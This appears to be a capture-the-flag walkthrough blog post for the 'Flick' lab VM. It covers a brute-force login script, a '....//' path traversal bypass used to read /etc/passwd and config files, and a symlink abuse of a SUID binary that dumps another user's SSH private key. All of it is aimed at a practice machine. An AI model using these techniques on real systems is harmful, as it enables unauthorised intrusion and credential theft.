Vm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==&rsquo;</p>

<p>count = 0
while True:</p>

<pre><code>try:
    secret = base64.b64decode(secret)
    print 'Try ' + str(count) + ': ' + secret
    count += 1
except TypeError:
    print 'Done'
    break
</code></pre>

<p>```</p>

<p>It took 16 decodings to produce a non Base64 string that might work as password for the admin server. The end result is <code>tabupJievas8Knoj</code></p>

<p>``` plain
root@kali:~# nc 192.168.80.129 8881
Welcome to the admin server. A correct password will &lsquo;flick&rsquo; the switch and open a new door:</p>

<blockquote><p>tabupJievas8Knoj
OK: tabupJievas8Knoj</p></blockquote>

<p>Accepted! The door should be open now :poolparty:</p>

<blockquote><p>```</p></blockquote>

<p>I tried poolparty as the SSH password but of course it wouldn&rsquo;t be that easy! We started with only 2 open ports, so there isn&rsquo;t much room for progression on that front, but what door is open now? I started another Nmap scan, and there is indeed something that wasn&rsquo;t here before:</p>

<p><code>plain
...
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Flick-a-Photo
...
</code></p>

<p><img class="center" src="/images/pentest/flick/cats.png" title="&lsquo;flick a photo&rsquo; &lsquo;flick cats&rsquo;" ></p>

<p>It&rsquo;s an image gallery of cats. After you feasted your eyes on all of them, check the login page:</p>

<p><img class="center" src="/images/pentest/flick/login.png" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>

<p>Right, I don&rsquo;t see any credentials lying around in the source. I tried modifying the URL from <code><a href="http://192.168.80.129/login/login">http://192.168.80.129/login/login</a></code>, and there is a directory index coming up, but it&rsquo;s fake:</p>

<p><img class="center" src="/images/pentest/flick/index.png" title="&lsquo;fake index&rsquo; &lsquo;index&rsquo;" ></p>

<p>You get the same page no matter what you add in the URL or click on the supposed directories. I tried SQL injection next. If you insert a single quote, you get this message:</p>

<p><code>plain
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND user.password=' at line 1
</code></p>

<p>But this message remains unchanged no matter the variation of the injections, and there is no reaction if you try double quotes or backslashes. I tested it with Sqlmap and it reported that none of the parameters are dynamic nor injectable, so it seems like another fake lead.</p>

<p>Right, so it&rsquo;s time to focus on the hint. I tried logging in with <em>demo:demo</em>, but it didn&rsquo;t work. Because the hint specified a demo user, it&rsquo;s safe to assume the username will be demo. And with no other hint, and lengthy bruteforcing not being a desired goal of the exercise, we can assume that the password is also some variation that includes the word demo. Most likely an addition of a few digits. Whenever I think the password would be weak and obvious, or I am clueless and hope for the best, I try the obvious word by itself, or followed by 123 or 1234. I never really expect it to work, but..it did! The password is actually <em>demo123</em>. However, for the sake of exercise, let&rsquo;s assume we didn&rsquo;t imagine any possible password and we need to do it conventionally..by building a wordlist and bruteforcing the login page.</p>

<p>So, the first step is to build a wordlist. If we think about it, the password will most likely contain the word demo, so its minimum length would be 5 (already tried demo), and its maximum would be 8, to accommodate some trailing digits / letters, or a repetition of the word itself. I will give 2 examples of creating a wordlist, but will use a much reduced list for the actual bruteforcing part.</p>

<p>In the first example, I used crunch to generate a wordlist. To keep up with the constraints, it should be composed of 5-8 characters, with the string &ldquo;demo&rdquo; occurring at the beginning or the end. I assummed the letters would be lowercase only.</p>

<p>``` plain
crunch 7 7 -t demo%%% -o /root/Desktop/wordlist.txt
Crunch will now generate the following amount of data: 8000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000</p>

<p>crunch: 100% completed generating output
&hellip;
crunch 7 7 -t demo@@@ -o /root/Desktop/wordlist2.txt
Crunch will now generate the following amount of data: 140608 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 17576</p>

<p>crunch: 100% completed generating output
```</p>

<p>In this example, I specified the min and max length as 7 (since I couldn&rsquo;t figure out from my speedy reading how to make crunch to build variable length words from the pattern, to build a full wordlist I would repeat it for every length and pattern that must be met and merge the results). The <em>-o</em> parameter is for the output file, and the <em>-t</em> parameter is for the pattern, followed by wildcard symbols (<em>%</em> for numbers, <em>@</em> for lowercase).</p>

<p>The second example will use our buddy, John the Ripper. Starting from a file called demo.txt, which only has the word demo in it, I let john build passwords originating from the word demo by using the jumbo rules from <code>/etc/john/john.conf</code></p>

<p><code>plain
john --rules=jumbo --wordlist=demo.txt --stdout &gt;&gt; wordlist.txt
words: 5116  time: 0:00:00:00 DONE (Wed Feb 11 14:44:42 2015)  w/s: 102320  current: DEMO
</code></p>

<p>This wordlist also contains uppercase variations. Here&rsquo;s a breakdown of the command:</p>

<ul>
<li><strong>&mdash;rules=jumbo</strong> Enables wordlist rules, that are read from [List.Rules:Wordlist]
                  in  /etc/john/john.conf  (or  the alternative configuration file
                  you might specify on the command line).
                  This option requires the -wordlist option to be passed as well.</li>
</ul>


<p>And the jumbo rules from john&rsquo;s configuration file:</p>

<p>``` plain</p>

<h1>For Wordlist mode and very fast hashes</h1>

<p>[List.Rules:Jumbo]
.include [List.Rules:Wordlist]
.include [List.Rules:Single]
.include [List.Rules:Extra]
.include [List.Rules:NT]
```</p>

<p>So this actually includes 4 other rules.</p>

<ul>
<li><p><strong>&mdash;wordlist=demo.txt</strong> These are used to enable the wordlist mode, reading  words  from FILE.</p></li>
<li><p><strong>&mdash;stdout >> wordlist.txt</strong> When used with a cracking mode, except for &ldquo;single crack&rdquo;, makes
                             John print the words it generates to stdout instead of cracking.</p></li>
</ul>


<p>Since we aren&rsquo;t cracking anything, we redirect the passwords to a file.</p>

<p>Next, for the bruteforcing part, I will use just a few samples to illustrate the exercise.</p>

<p><code>plain
root@kali:~/Desktop# cat wordlist.txt
demodemo
demo007
demo123
</code></p>

<p>I wrote a Python script to attempt the login:</p>

<p>``` python
import urllib, urllib2
import cookielib</p>

<p>wordlist = &lsquo;/root/Desktop/wordlist.txt&rsquo;
passwords = []
with open(wordlist, &lsquo;r&rsquo;) as f:</p>

<pre><code>for line in f.readlines():
    passwords.append(line.strip('\n'))
</code></pre>

<p>url = &lsquo;<a href="http://192.168.80.129/login/login">http://192.168.80.129/login/login</a>&rsquo; <br/>
fail = &lsquo;Your username/password combination was incorrect&rsquo;</p>

<p>username = &lsquo;demo&rsquo;
password = &lsquo;&rsquo;</p>

<p>jar = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
opener.addheaders.append((&lsquo;Cookie&rsquo;, &lsquo;laravel_session=eyJpdiI6IkxSQlRpb1NyTDc1VDZNMG9jaGZiUDRNbmxXNlgxbUVFWllZXC9Jemp4a0RzPSIsInZhbHVlIjoiTUVkd1VXMkxLY2p1czJFc1B5aTA0eG9hb3A3Zmt2cHJlWlNSMEFkMW54cmJFNmk3VFluaE9qTlgydVlGVStGenI0RjdiR2JHc3h4Y1wvZFBkM3JTa1N3PT0iLCJtYWMiOiJiNzk4NGEwMzQzN2Y4YTM4OWVhOTZjODM2YzRiMjI5ODM2MTFlNGQxMzM3NjA4ZjQ5M2EyOTNmYTE5NGNiMDZmIn0%3D&rsquo;))</p>

<p>for passwd in passwords:</p>

<pre><code>print 'Trying: ' + passwd
payload = {'_token': 'p8xqSfrmqsYs7jvIpZbnoMG03FRxQYueO2LAcWAp',
           'username': 'demo',
           'password': passwd}
data = urllib.urlencode(payload)
req = opener.open(url, data)
if fail not in req.read():
    print 'Success with password: ' + passwd
    break
</code></pre>

<p>```</p>

<p>And its output:</p>

<p><code>plain
Trying: demodemo
Trying: demo007
Trying: demo123
Success with password: demo123
</code></p>

<p>After all the work (or guessing) to log in, the only extra things we can do is upload photos or download photos from the gallery. First, I tried uploading a PHP file to see if I could get code execution, but it didn&rsquo;t work. All I could see was a blank page.</p>

<p>Next thing I tried was LFI (local file inclusion). When downloading images, you can see the URL looks like this: <code><a href="http://192.168.80.129/image/download?filename=images/mPTRlZ8Bf3Wt">http://192.168.80.129/image/download?filename=images/mPTRlZ8Bf3Wt</a></code>. So I tried to read <em>/etc/passwd</em> in the most straightforward way: <code><a href="http://192.168.80.129/image/download?filename=../../../../etc/passwd">http://192.168.80.129/image/download?filename=../../../../etc/passwd</a></code>. Upon doing this, I got the following message:</p>

<p>``` plain
Oops! Looks like you requested a invalid file to download!</p>

<p>etc/passwd is not valid.
```</p>

<p>So everything was removed from my attempt. It&rsquo;s most likely there is a filter in place. Let&rsquo;s see. When I tried <code><a href="http://192.168.80.129/image/download?filename=../../../.././etc/passwd">http://192.168.80.129/image/download?filename=../../../.././etc/passwd</a></code>, I got a slightly different error:</p>

<p>``` plain
Oops! Looks like you requested a invalid file to download!</p>

<p>./etc/passwd is not valid.
```</p>

<p>Ok, so to bypass the filter I used <code>192.168.80.129/image/download?filename=&hellip;.//&hellip;.//&hellip;.//&hellip;.//etc/passwd</code>. This prompted me to download an image, and I wasted time trying to figure out why it wouldn&rsquo;t work. Trying to view the image I got the error that it can&rsquo;t be displayed because it contains errors. Finally it struck me to run strings on it and:</p>

<p><code>plain
root@kali:~/Desktop# strings image.jpg
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
dean:x:1001:1001:,,,:/home/dean:/bin/bash
</code></p>

<p>Finally getting somewhere! To the bottom we can see potentially interesting users, robin and dean. But how to actually get in the box?</p>

<p>Well, the answer lies in combining the ability to read local files with some knowledge of the framework used behind the scenes. Remember the <code>laravel_session</code> cookie? Laravel is a &ldquo;PHP Framework For Web Artisans&rdquo;. The official documentation is a great place to get started. While looking around, I hit this <a href="http://laravel.com/docs/5.0/database">database</a> page, and read about a file that we might be interested in: <code>config/database.php</code>. This is the config file for the database, where you can specify the connections' details. And it&rsquo;s important for us, because it should contain usernames and passwords. Also, if you check the laravel <a href="http://laravel.com/docs/5.0/configuration">configuration</a> page, you will notice that the default installation directory is named <em>app</em>. To read the file we want, we would have to look for it under <code>app/config/database.php</code>. But before that, we have to know the root of the website. At this point I had to do some online reading, because I couldnt find the <em>httpd.conf</em> file, and some other files I&rsquo;ve pulled from the server weren&rsquo;t helpful. The one that contained the necessary information was <code>/etc/apache2/sites-enabled/000-default</code>. Since I have yet to seriously start playing with Apache, I&rsquo;m not very knowledgeable about its workings, but this file is a symbolic link to <code>/etc/apache2/sites-available/default</code>. In the <code>/sites-available/</code> folder there are configuration files for every site that you want to serve (in Apache, these are called virtual hosts). The <em>default</em> site is, uhm, just that, the default site of the Apache installation. And in the <code>/sites-enabled/</code> directory there are symbolic links for every active site (that you&rsquo;re actually serving). Hence the file that we&rsquo;re requesting is a symbolic link to the default site that&rsquo;s being served.</p>

<p>Back to the problem at hand, I downloaded the file as follows: <code>192.168.80.129/image/download?filename=&hellip;.//&hellip;.//&hellip;.//&hellip;.///etc/apache2/sites-enabled/000-default</code> and ran strings on it:</p>

<p>``` plain
root@kali:~/Desktop# strings image.jpg
<VirtualHost *:80></p>

<pre><code>ServerAdmin webmaster@localhost
DocumentRoot /var/www/flick_photos/public
&lt;Directory /&gt;
    Options FollowSymLinks
    AllowOverride None
&lt;/Directory&gt;
&lt;Directory /var/www/flick_photos/public&gt;
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Order allow,deny
    allow from all
&lt;/Directory&gt;
ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
&lt;Directory "/usr/lib/cgi-bin"&gt;
    AllowOverride None
    Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
    Order allow,deny
    Allow from all
&lt;/Directory&gt;
ErrorLog ${APACHE_LOG_DIR}/error.log
# Possible values include: debug, info, notice, warn, error, crit,
# alert, emerg.
LogLevel warn
CustomLog ${APACHE_LOG_DIR}/access.log combined
Alias /doc/ "/usr/share/doc/"
&lt;Directory "/usr/share/doc/"&gt;
    Options Indexes MultiViews FollowSymLinks
    AllowOverride None
    Order deny,allow
    Deny from all
    Allow from 127.0.0.0/255.0.0.0 ::1/128
&lt;/Directory&gt;
</code></pre>

<p></VirtualHost>
```</p>

<p>Great! With this knowledge, we have a way to search for the Laravel database file: <code><a href="http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/config/database.php">http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/config/database.php</a></code>. Again, to read it, I ran strings on it:</p>

<p>``` plain
root@kali:~/Desktop# strings image.jpg
&lt;?php
return array(</p>

<pre><code>|--------------------------------------------------------------------------
| PDO Fetch Style
|--------------------------------------------------------------------------
| By default, database results will be returned as instances of the PHP
| stdClass object; however, you may desire to retrieve records in an
| array format for simplicity. Here you can tweak the fetch style.
'fetch' =&gt; PDO::FETCH_CLASS,
|--------------------------------------------------------------------------
| Default Database Connection Name
|--------------------------------------------------------------------------
| Here you may specify which of the database connections below you wish
| to use as your default connection for all database work. Of course
| you may use many connections at once using the Database library.
// Jan 2014 note: We have moved away from the old crappy SQLite 2.x database and moved
// on to the new and improved MySQL database. So, I will just comment out this as it is
// no longer in use
//'default' =&gt; 'sqlite',
'default' =&gt; 'mysql',
|--------------------------------------------------------------------------
| Database Connections
|--------------------------------------------------------------------------
| Here are each of the database connections setup for your application.
| Of course, examples of configuring each database platform that is
| supported by Laravel is shown below to make development simple.
| All database work in Laravel is done through the PHP PDO facilities
| so make sure you have the driver for your particular database of
| choice installed on your machine before you begin development.
'connections' =&gt; array(
    'sqlite' =&gt; array(
        'driver'   =&gt; 'sqlite',
        'database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
        'prefix'   =&gt; '',
    ),
    'mysql' =&gt; array(
        'driver'    =&gt; 'mysql',
        'host'      =&gt; 'localhost',
        'database'  =&gt; 'flick',
        'username'  =&gt; 'flick',
        'password'  =&gt; 'resuddecNeydmar3',
        'charset'   =&gt; 'utf8',
        'collation' =&gt; 'utf8_unicode_ci',
        'prefix'    =&gt; '',
    ),
    'pgsql' =&gt; array(
        'driver'   =&gt; 'pgsql',
        'host'     =&gt; 'localhost',
        'database' =&gt; 'forge',
        'username' =&gt; 'forge',
        'password' =&gt; '',
        'charset'  =&gt; 'utf8',
        'prefix'   =&gt; '',
        'schema'   =&gt; 'public',
    ),
    'sqlsrv' =&gt; array(
        'driver'   =&gt; 'sqlsrv',
        'host'     =&gt; 'localhost',
        'database' =&gt; 'database',
        'username' =&gt; 'root',
        'password' =&gt; '',
        'prefix'   =&gt; '',
    ),
|--------------------------------------------------------------------------
| Migration Repository Table
|--------------------------------------------------------------------------
| This table keeps track of all the migrations that have already run for
| your application. Using this information, we can determine which of
| the migrations on disk haven't actually been run in the database.
'migrations' =&gt; 'migrations',
|--------------------------------------------------------------------------
| Redis Databases
|--------------------------------------------------------------------------
| Redis is an open source, fast, and advanced key-value store that also
| provides a richer set of commands than a typical key-value systems
| such as APC or Memcached. Laravel makes it easy to dig right in.
'redis' =&gt; array(
    'cluster' =&gt; false,
    'default' =&gt; array(
        'host'     =&gt; '127.0.0.1',
        'port'     =&gt; 6379,
        'database' =&gt; 0,
    ),
</code></pre>

<p>```</p>

<p>Unfortunately, there were no passwords here, but it seems we should investigate further:</p>

<p><code>plain
'database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
</code></p>

<p>So I went to download the sqlite file from <code><a href="http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/database/production.sqlite">http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/database/production.sqlite</a></code>, and this one was the jackpot!</p>

<p>``` plain
root@kali:~/Desktop# strings image.jpg
<strong> This file contains an SQLite 2.1 database </strong>
 &ldquo;^table
old_users
old_users
CREATE TABLE old_users (
  username text,
  password text
Ipaul
nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi</p>

<pre><code>Jrobin
</code></pre>

<p>JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1</p>

<pre><code>Jjames
</code></pre>

<p>scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5
Idean
FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
```</p>

<p>Passwords for the users we discovered earlier in the <em>/etc/passwd</em> file! I tried SSH'ing, and robin&rsquo;s password didn&rsquo;t work, but dean&rsquo;s did!</p>

<p>``` plain
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
</ul>


<p>  System information as of Fri Feb 13 14:34:19 SAST 2015</p>

<p>  System load:  0.0               Processes:              82
  Usage of /:   36.1% of 6.99GB   Users logged in:        0
  Memory usage: 39%               IP address for eth0:    192.168.80.129
  Swap usage:   0%                IP address for docker0: 172.17.42.1</p>

<p>  Graph this data and manage this system at:</p>

<pre><code>https://landscape.canonical.com/
</code></pre>

<p>New release &lsquo;14.04.1 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</p>

<p>Last login: Sat Aug  2 14:42:15 2014 from 192.168.56.1
dean@flick:~$ ls
message.txt  read_docker
```</p>

<p>The message is as follows:</p>

<p>``` plain
dean@flick:~$ cat message.txt
&mdash;&mdash;-BEGIN PGP SIGNED MESSAGE&mdash;&mdash;&ndash;
Hash: SHA1</p>

<p>Hi Dean,</p>

<p>I will be away on leave for the next few weeks. I have asked the admin guys to
write a quick script that will allow you to read my .dockerfile for flick-
a-photo so that you can continue working in my absense.</p>

<p>The .dockerfile is in my home, so the path for the script will be something like
/home/robin/flick-dev/</p>

<p>Please call me if you have any troubles!</p>

<hr />

<p>Ciao
Robin
&mdash;&mdash;-BEGIN PGP SIGNATURE&mdash;&mdash;&ndash;
Version: GnuPG v1</p>

<p>iQIcBAEBAgAGBQJT32ZsAAoJENRCTh/agc2DTNIP/0+ut1jWzk7VgJlT6tsGB0Ah
yi24i2b+JAVtINzCNgJ+rXUStaAEudTvJDF28b/wZCaFVFoNJ8Q30J03FXo4SRnA
ZW6HZZIGEKdlD10CcXsQrLMRmWZlBDQnCm4+EMOvavS1uU9gVvcaYhnow6uwZlwR
enf71LvtS1h0+PrFgSIoItBI4/lx7BiYY9o3hJyaQWkmAZsZLWQpJtROe8wsxb1l
9o4jCJrADeJBsYM+xLExsXaEobHfKtRtsM+eipHXIWIH+l+xTi8Y1/XIlgEHCelU
jUg+Hswq6SEch+1T5B+9EPoeiLT8Oi2Rc9QePSZ3n0fe4f3WJ47lEYGLLEUrKNG/
AFLSPnxHTVpHNO72KJSae0cG+jpj1OKf3ErjdTk1PMJy75ntQCrgtnGnp9xvpk0b
0xg6cESLGNkrqDGopsN/mgi6+2WKtUuO5ycwVXFImY3XYl+QVZgd/Ntpu4ZjyZUT
lxqCAk/G1s43s+ySFKSoHZ8c/CuOKTsyn6uwI3NxBZPD04xfzoc0/R/UpIpUmneK
q9LddBQK4vxPab8i4GNDiMp+KXyfByO864PtKQnCRkGQewanxoN0lmjB/0eKhkmf
Yer1sBmumWjjxR8TBY3cVRMH93zpIIwqxRNOG6bnnSVzzza5DJuNssppCmXLOUL9
nZAuFXkGFu6cMMD4rDXQ
=2moZ
&mdash;&mdash;-END PGP SIGNATURE&mdash;&mdash;&ndash;
```</p>

<p>Before continuing, if you wonder <a href="https://www.docker.com/whatisdocker/">what is docker?</a>:</p>

<blockquote><p>Docker is an open platform for developers and sysadmins to build, ship, and run distributed applications. Consisting of
Docker Engine, a portable, lightweight runtime and packaging tool, and Docker Hub, a cloud service for sharing applications
and automating workflows, Docker enables apps to be quickly assembled from components and eliminates the friction between
development, QA, and production environments. As a result, IT can ship  faster and run the same app, unchanged, on laptops,
data center VMs, and any cloud.</p></blockquote>

<p>So, I used the script to read robin&rsquo;s dockerfile, per the instructions:</p>

<p>``` plain
dean@flick:~$ ./read_docker /home/robin/flick-dev/</p>

<h1>Flick-a-photo dev env</h1>

<p>RUN apt-get update &amp;&amp; apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli &amp;&amp; apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/*</p>

<p>CMD [&ldquo;/usr/sbin/apache2&rdquo;, &ldquo;-D&rdquo;, &ldquo;FOREGROUND&rdquo;]
```</p>

<p>At this point, it wasn&rsquo;t exactly clear to me how to continue, so I looked at the executable itself:</p>

<p>``` plain
dean@flick:~$ file read_docker
read_docker: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5b429ab297ac0bd55150f9ef54738b366f643336, not stripped</p>

<p>dean@flick:~$ strings read_docker
/lib64/ld-linux-x86-64.so.2
sT63do
<strong>gmon_start</strong>
libc.so.6
sprintf
fopen
fgetc
memset
stdout
fputc
fclose
malloc
stderr
fwrite
fprintf
__libc_start_main
free
GLIBC_2.2.5
%z <br/>
%r <br/>
%j <br/>
%b <br/>
%Z <br/>
%R <br/>
%J <br/>
%B <br/>
%: <br/>
fff.
l$ L
t$(L
|$0H
/Dockerfile
ERROR: A path is required!
Usage is: %s /path/to/dockerfile
%s%s
ERROR: the specified docker file doesn&rsquo;t exist: %s
;*3$&ldquo;
```</p>

<p>Well, this is a SUID binary, and the owner is robin, so we should be able to read files that robin has permissions to read..or so I thought:</p>

<p><code>plain
dean@flick:~$ ./read_docker /home/robin/.bash_history
ERROR: the specified docker file doesn't exist: /home/robin/.bash_history/Dockerfile
Usage is: ./read_docker /path/to/dockerfile
</code></p>

<p>So it appears to append a Dockerfile to the path that you enter. Judging from this, it won&rsquo;t be able to read the contents if there is no Dockerfile present. But what if we create a Dockerfile in dean&rsquo;s home directory and link it to stuff that robin should have access to? I still couldn&rsquo;t read the <em>.bash_history</em> file, so there probably isn&rsquo;t one, but..</p>

<p><code>plain
ean@flick:~$ ln -s /home/robin/.bashrc Dockerfile
dean@flick:~$ ls -la
total 44
drwxr-xr-x 3 dean  dean  4096 Feb 23 13:54 .
drwxr-xr-x 4 root  root  4096 Aug  2  2014 ..
-rw------- 1 dean  dean   143 Feb 13 15:46 .bash_history
-rw-r--r-- 1 dean  dean   220 Aug  2  2014 .bash_logout
-rw-r--r-- 1 dean  dean  3486 Aug  2  2014 .bashrc
drwx------ 2 dean  dean  4096 Aug  2  2014 .cache
lrwxrwxrwx 1 dean  dean    19 Feb 23 13:54 Dockerfile -&gt; /home/robin/.bashrc
-rw-r--r-- 1 root  root  1250 Aug  4  2014 message.txt
-rw-r--r-- 1 dean  dean   675 Aug  2  2014 .profile
-rwsr-xr-x 1 robin robin 8987 Aug  4  2014 read_docker
</code></p>

<p>If you look at the link you created, it says it&rsquo;s a broken symbolic link:</p>

<p><code>plain
dean@flick:~$ file Dockerfile
Dockerfile: broken symbolic link to `/home/robin/.bashrc'
</code></p>

<p>However, that doesn&rsquo;t seem to stop the <em>read_docker</em> binary from doing its thing!</p>

<p>``` plain
dean@flick:~$ ./read_docker /home/dean</p>

<h1>~/.bashrc: executed by bash(1) for non-login shells.</h1>

<h1>see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</h1>

<h1>for examples</h1>

<h1>If not running interactively, don&rsquo;t do anything</h1>

<p>[ -z &ldquo;$PS1&rdquo; ] &amp;&amp; return</p>

<h1>don&rsquo;t put duplicate lines or lines starting with space in the history.</h1>

<h1>See bash(1) for more options</h1>

<p>HISTCONTROL=ignoreboth</p>

<h1>append to the history file, don&rsquo;t overwrite it</h1>

<p>shopt -s histappend</p>

<h1>for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</h1>

<p>HISTSIZE=1000
HISTFILESIZE=2000
&hellip;
```</p>

<p>So,we were able to read robin&rsquo;s <em>.bashrc</em> file. That doesn&rsquo;t help us much, but now we know that we can use this to our advantage, if the file that we want to read exists. Let&rsquo;s see if we can&rsquo;t get robin&rsquo;s SSH private key:</p>

<p>``` plain
dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
dean@flick:~$ ls -la Dockerfile
lrwxrwxrwx 1 dean dean 23 Feb 23 14:06 Dockerfile &ndash;> /home/robin/.ssh/id_rsa</p>

<p>dean@flick:~$ ./read_docker /home/dean
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
```</p>

